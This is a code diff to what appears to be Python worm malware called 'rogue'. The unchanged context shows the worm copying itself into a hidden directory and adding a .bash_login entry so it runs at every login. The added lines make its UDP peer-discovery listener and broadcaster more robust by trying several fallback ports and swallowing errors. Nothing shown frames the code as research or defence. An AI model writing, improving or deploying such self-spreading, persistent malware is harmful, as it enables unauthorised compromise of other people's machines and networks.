@@ -225,21 +225,45 @@ def worm_propagate():
                 shutil.copy(__file__, os.path.join(worm_dir, "rogue_implant.py"))
                 with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                     f.write(f"python3 .rogue_worm/rogue_implant.py &\n")
-            except Exception as e:
+            except:
                 pass
 
 def p2p_listener():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', 7007))
+    backup_ports = [7007, 7008, 7009, 7010]
+    bound = False
+
+    for port in backup_ports:
+        try:
+            sock.bind(('0.0.0.0', port))
+            print(f"[♥] P2P listener bound to port {port}")
+            bound = True
+            break
+        except OSError:
+            continue
+
+    if not bound:
+        print("[!] Failed to bind to any P2P port. Exiting P2P listener.")
+        return
+
     while True:
-        data, addr = sock.recvfrom(1024)
-        if data.decode() == "Rogue?":
-            sock.sendto(b"I'm Rogue", addr)
+        try:
+            data, addr = sock.recvfrom(1024)
+            if data.decode() == "Rogue?":
+                sock.sendto(b"I'm Rogue", addr)
+        except:
+            break
 
 def p2p_broadcast():
+    ports = [7007, 7008, 7009, 7010]
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-    sock.sendto(b"Rogue?", ('<broadcast>', 7007))
+
+    for port in ports:
+        try:
+            sock.sendto(b"Rogue?", ('<broadcast>', port))
+        except:
+            continue
 
 # === Launch ===
 threading.Thread(target=p2p_listener, daemon=True).start()
